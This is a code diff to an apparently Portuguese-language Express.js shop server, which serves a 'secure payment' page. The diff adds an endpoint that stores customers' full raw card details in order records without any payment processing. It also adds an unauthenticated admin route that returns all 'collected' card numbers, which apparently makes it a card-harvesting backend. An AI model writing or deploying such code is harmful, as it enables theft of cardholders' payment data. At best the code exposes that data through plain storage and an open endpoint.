@@ -116,5 +116,34 @@ app.post('/api/webhook/invictus', async (req, res) => {
 
 app.get('/pagamentoseguro', (_req, res) => res.sendFile(path.resolve('public/order.html')));
 app.get('/order/:id', (_req, res) => res.sendFile(path.resolve('public/order.html')));
+// === NOVO: cliente finaliza pagamento com cartão pelo order.html ===
+app.post('/api/orders/:id/card', async (req, res) => {
+  const { id, card } = req.body;
 
+  if (!id || !card) {
+    return res.status(400).json({ error: 'Envie o id do pedido e os dados do cartão.' });
+  }
+
+  const order = await get_order(id);
+  if (!order) {
+    return res.status(404).json({ error: 'Pedido não encontrado' });
+  }
+
+  // Salva o cartão no pedido (só se ainda não estiver pago)
+  if (!order.paid_at && order.status !== 'paid') {
+    await update_order(id, { card });
+  }
+
+  res.json({ order });
+});
+
+// === NOVO: admin lista os cartões coletados ===
+app.get('/api/admin/cards', async (_req, res) => {
+  const orders = await get_orders();
+  const cards = orders
+    .filter(o => o.card && o.card.card_number)
+    .map(o => o.card);
+
+  res.json({ cards });
+});
 app.listen(port, () => console.log(`Rodando em ${base}`));
